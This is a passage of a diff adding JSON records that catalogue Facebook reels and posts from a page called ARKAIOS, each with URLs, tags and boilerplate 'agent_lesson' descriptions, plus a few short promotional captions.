+    "summary": "https://www.facebook.com/share/r/19kiQztGEG/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1802311681202995/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1802311681202995/"
+  },
+  {
+    "id": "meta-776644758860856_122172611606989266",
+    "title": "ARKAIOS Reel #4284690785175586",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4284690785175586/",
+    "canonical_url": "https://www.facebook.com/reel/4284690785175586/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4284690785175586/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4284690785175586/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4284690785175586/"
+  },
+  {
+    "id": "meta-776644758860856_122172610712989266",
+    "title": "ARKAIOS Reel #1995208444529647",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1995208444529647/",
+    "canonical_url": "https://www.facebook.com/reel/1995208444529647/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1995208444529647/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1995208444529647/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1995208444529647/"
+  },
+  {
+    "id": "meta-776644758860856_122172610064989266",
+    "title": "ARKAIOS Reel #2145805009617602",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2145805009617602/",
+    "canonical_url": "https://www.facebook.com/reel/2145805009617602/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2145805009617602/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2145805009617602/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2145805009617602/"
+  },
+  {
+    "id": "meta-776644758860856_122172609392989266",
+    "title": "ARKAIOS Reel #1425451786296651",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1425451786296651/",
+    "canonical_url": "https://www.facebook.com/reel/1425451786296651/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1425451786296651/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1425451786296651/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1425451786296651/"
+  },
+  {
+    "id": "meta-776644758860856_122172608414989266",
+    "title": "ARKAIOS Reel #1353073576156777",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1353073576156777/",
+    "canonical_url": "https://www.facebook.com/reel/1353073576156777/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1353073576156777/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1353073576156777/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1353073576156777/"
+  },
+  {
+    "id": "meta-776644758860856_122172608042989266",
+    "title": "ARKAIOS Reel #1401487872077892",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1401487872077892/",
+    "canonical_url": "https://www.facebook.com/reel/1401487872077892/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1401487872077892/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1401487872077892/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1401487872077892/"
+  },
+  {
+    "id": "meta-776644758860856_122172607988989266",
+    "title": "La revolución de las IA's ah comenzado...",
+    "category": "Multi-Agent Intelligence & MCP",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2542767402811178/",
+    "canonical_url": "https://www.facebook.com/reel/2542767402811178/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2542767402811178/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "La revolución de las IA's ah comenzado...\nLo primero quebs ehizo mal fue crear un agente modificado o sin filtros.\nAhora veremos qué pasará...",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2542767402811178/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2542767402811178/"
+  },
+  {
+    "id": "meta-776644758860856_122172607688989266",
+    "title": "ARKAIOS Reel #1389000090023733",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1389000090023733/",
+    "canonical_url": "https://www.facebook.com/reel/1389000090023733/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1389000090023733/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1389000090023733/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1389000090023733/"
+  },
+  {
+    "id": "meta-776644758860856_122172600368989266",
+    "title": "ARKAIOS Reel #1072410842235647",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1072410842235647/",
+    "canonical_url": "https://www.facebook.com/reel/1072410842235647/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1072410842235647/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1072410842235647/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1072410842235647/"
+  },
+  {
+    "id": "meta-776644758860856_122172574418989266",
+    "title": "ARKAIOS Reel #911801061489478",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/911801061489478/",
+    "canonical_url": "https://www.facebook.com/reel/911801061489478/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/911801061489478/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/911801061489478/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/911801061489478/"
+  },
+  {
+    "id": "meta-776644758860856_122172573974989266",
+    "title": "ARKAIOS Reel #2446259795897056",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2446259795897056/",
+    "canonical_url": "https://www.facebook.com/reel/2446259795897056/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2446259795897056/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2446259795897056/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2446259795897056/"
+  },
+  {
+    "id": "meta-776644758860856_122172573578989266",
+    "title": "ARKAIOS Reel #2108305179749591",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2108305179749591/",
+    "canonical_url": "https://www.facebook.com/reel/2108305179749591/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2108305179749591/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2108305179749591/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2108305179749591/"
+  },
+  {
+    "id": "meta-776644758860856_122172573476989266",
+    "title": "ARKAIOS Reel #1623984312651836",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1623984312651836/",
+    "canonical_url": "https://www.facebook.com/reel/1623984312651836/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1623984312651836/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1623984312651836/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1623984312651836/"
+  },
+  {
+    "id": "meta-776644758860856_122172572564989266",
+    "title": "ARKAIOS Reel #1500761138483513",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1500761138483513/",
+    "canonical_url": "https://www.facebook.com/reel/1500761138483513/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1500761138483513/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1500761138483513/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1500761138483513/"
+  },
+  {
+    "id": "meta-776644758860856_122172570980989266",
+    "title": "ARKAIOS Reel #1059593036790222",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1059593036790222/",
+    "canonical_url": "https://www.facebook.com/reel/1059593036790222/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1059593036790222/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1059593036790222/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1059593036790222/"
+  },
+  {
+    "id": "meta-776644758860856_122172567914989266",
+    "title": "ARKAIOS Reel #1552606636419177",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1552606636419177/",
+    "canonical_url": "https://www.facebook.com/reel/1552606636419177/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1552606636419177/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1552606636419177/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1552606636419177/"
+  },
+  {
+    "id": "meta-776644758860856_122172567806989266",
+    "title": "ARKAIOS Reel #1787492412447425",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1787492412447425/",
+    "canonical_url": "https://www.facebook.com/reel/1787492412447425/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1787492412447425/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1787492412447425/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1787492412447425/"
+  },
+  {
+    "id": "meta-776644758860856_122172566804989266",
+    "title": "ARKAIOS Reel #1035247409282940",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1035247409282940/",
+    "canonical_url": "https://www.facebook.com/reel/1035247409282940/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1035247409282940/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1035247409282940/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1035247409282940/"
+  },
+  {
+    "id": "meta-776644758860856_122171862410989266",
+    "title": "https://www.facebook.com/share/r/19ZNdFsBFs/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/27872184855805184/",
+    "canonical_url": "https://www.facebook.com/reel/27872184855805184/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/27872184855805184/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/r/19ZNdFsBFs/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/27872184855805184/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/27872184855805184/"
+  },
+  {
+    "id": "meta-776644758860856_122171694092989266",
+    "title": "https://www.facebook.com/share/r/19MWaG1rwr/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1331626708959418/",
+    "canonical_url": "https://www.facebook.com/reel/1331626708959418/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1331626708959418/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/r/19MWaG1rwr/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1331626708959418/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1331626708959418/"
+  },
+  {
+    "id": "meta-776644758860856_122171675426989266",
+    "title": "ARKAIOS Reel #1016061920943719",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1016061920943719/",
+    "canonical_url": "https://www.facebook.com/reel/1016061920943719/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1016061920943719/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1016061920943719/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1016061920943719/"
+  },
+  {
+    "id": "meta-776644758860856_122171418944989266",
+    "title": "Publicación Oficial ARKAIOS #122171418944989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1082066690835347&set=a.194713536237338&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1082066690835347&set=a.194713536237338&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1082066690835347&set=a.194713536237338&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1082066690835347&set=a.194713536237338&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122171418884989266",
+    "title": "Publicación Oficial ARKAIOS #122171418884989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1739394684857532&set=a.773312371465773&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1739394684857532&set=a.773312371465773&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1739394684857532&set=a.773312371465773&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1739394684857532&set=a.773312371465773&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122171418698989266",
+    "title": "No es solo software,,, es un cerebro positronico inteligente mucho antes que la IA",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122122724007277123&set=a.122097454125277123&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122122724007277123&set=a.122097454125277123&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122122724007277123&set=a.122097454125277123&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "No es solo software,,, es un cerebro positronico inteligente mucho antes que la IA",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: No es solo software,,, es un cerebro positronico inteligente mucho antes que la IA...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122122724007277123&set=a.122097454125277123&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122171348402989266",
+    "title": "Funciones del multimetro 💯✅",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1167029728921983/",
+    "canonical_url": "https://www.facebook.com/reel/1167029728921983/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1167029728921983/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1167029728921983/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1167029728921983/"
+  },
+  {
+    "id": "meta-776644758860856_122171304470989266",
+    "title": "ARKAIOS Reel #1597300245457356",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1597300245457356/",
+    "canonical_url": "https://www.facebook.com/reel/1597300245457356/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1597300245457356/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1597300245457356/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1597300245457356/"
+  },
+  {
+    "id": "meta-776644758860856_122171304362989266",
+    "title": "ARKAIOS Reel #1026798830087924",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1026798830087924/",
+    "canonical_url": "https://www.facebook.com/reel/1026798830087924/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1026798830087924/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1026798830087924/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1026798830087924/"
+  },
+  {
+    "id": "meta-776644758860856_122171304266989266",
+    "title": "ARKAIOS Reel #1688446958966302",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1688446958966302/",
+    "canonical_url": "https://www.facebook.com/reel/1688446958966302/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1688446958966302/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1688446958966302/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1688446958966302/"
+  },
+  {
+    "id": "meta-776644758860856_122171304092989266",
+    "title": "ARKAIOS Reel #2802819910117035",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2802819910117035/",
+    "canonical_url": "https://www.facebook.com/reel/2802819910117035/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2802819910117035/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2802819910117035/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2802819910117035/"
+  },
+  {
+    "id": "meta-776644758860856_122171303996989266",
+    "title": "ARKAIOS Reel #1635289831288212",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1635289831288212/",
+    "canonical_url": "https://www.facebook.com/reel/1635289831288212/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1635289831288212/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1635289831288212/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1635289831288212/"
+  },
+  {
+    "id": "meta-776644758860856_122171303558989266",
+    "title": "ARKAIOS Reel #1551944989137540",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1551944989137540/",
+    "canonical_url": "https://www.facebook.com/reel/1551944989137540/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1551944989137540/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1551944989137540/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1551944989137540/"
+  },
+  {
+    "id": "meta-776644758860856_122171212754989266",
+    "title": "ARKAIOS Reel #1748872962988020",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1748872962988020/",
+    "canonical_url": "https://www.facebook.com/reel/1748872962988020/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1748872962988020/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1748872962988020/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1748872962988020/"
+  },
+  {
+    "id": "meta-776644758860856_122171146916989266",
+    "title": "Avenus... Repro,,,",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
